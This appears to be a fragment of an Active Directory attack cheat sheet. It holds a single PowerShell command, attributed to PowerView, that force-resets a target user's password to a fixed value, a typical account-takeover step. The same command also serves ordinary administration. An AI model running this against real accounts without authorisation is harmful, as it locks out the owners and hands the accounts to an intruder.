> Run in powershell using PowerView:

```
Set-ADAccountPassword -Identity <target_user> -NewPassword (ConvertTo-SecureString "NewPassword123@" -AsPlainText -Force)
```
